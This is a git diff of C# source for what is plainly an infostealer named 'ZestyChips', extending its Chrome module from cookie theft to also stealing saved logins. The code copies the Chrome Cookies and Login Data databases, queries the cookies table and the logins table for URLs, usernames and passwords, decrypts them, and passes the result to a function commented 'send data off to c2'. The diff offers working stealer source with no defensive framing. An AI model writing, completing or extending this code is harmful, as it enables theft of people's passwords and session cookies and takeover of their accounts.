@@ -28,10 +28,20 @@ namespace ZestyChips
         * stealer functions for Chrome
         */
         private static string Chrome() {
-            bool hasChrome = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
+            string cookies = StealChromeData("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", "cc");
+            string login = StealChromeData("\\Google\\Chrome\\User Data\\Default\\Login Data", "p");
+            return cookies;
+        }
+        
+        /*
+        * Generic entry to steal data from vaults, given an input path and save file name
+        * Returns a string, json serialised data
+        */
+        private static string StealChromeData(string path, string fileSaveName) {
+            bool hasChromeCookies = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path);
             string result;
 
-            if (hasChrome) {
+            if (hasChromeCookies) {
                 result = "Chrome not found";
                 return result;
             } else {
@@ -39,9 +49,8 @@ namespace ZestyChips
                 for(;;) {
                     // steal chrome cookies
                     try {
-                        // copy file to dest file name cc
-                        // Helpers.PrintInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
-                        File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", "cc", true);
+                        // copy file to dest file name
+                        File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path, fileSaveName, true);
                         break;
                     } catch (Exception ex) {
                         // exception will throw most likely if chrome is open
@@ -51,17 +60,30 @@ namespace ZestyChips
                     }
                 }
 
-                string cookies = DecryptChromeVault("cc");
-                Program.SendBase64EncodedData(cookies); // send data off to c2
-                return cookies;
+                string data = DecryptChromeVault(fileSaveName);
+                Program.SendBase64EncodedData(data); // send data off to c2
+                return data;
         }
-    }
+        }
+        
         private static string DecryptChromeVault(string dataSourceFile) {
 
             // open the Chrome cookies database
             SQLiteConnection sqliteConnection = new SQLiteConnection($"Data Source={dataSourceFile}");
             sqliteConnection.Open();
-            SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT host_key, name, encrypted_value FROM cookies", sqliteConnection);
+            SQLiteCommand sqliteCommand;
+            switch (dataSourceFile)
+            {
+                case "cc":
+                    sqliteCommand = new SQLiteCommand("SELECT host_key, name, encrypted_value FROM cookies", sqliteConnection);
+                    break;
+                case "p":
+                    sqliteCommand = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", sqliteConnection);
+                    break;
+                default:
+                    return "Error opening copied file";
+            }
+            
             SQLiteDataReader sdr = sqliteCommand.ExecuteReader();
 
             // dictionary to store the result of each iteration of data so we can concat into 1 json object to return
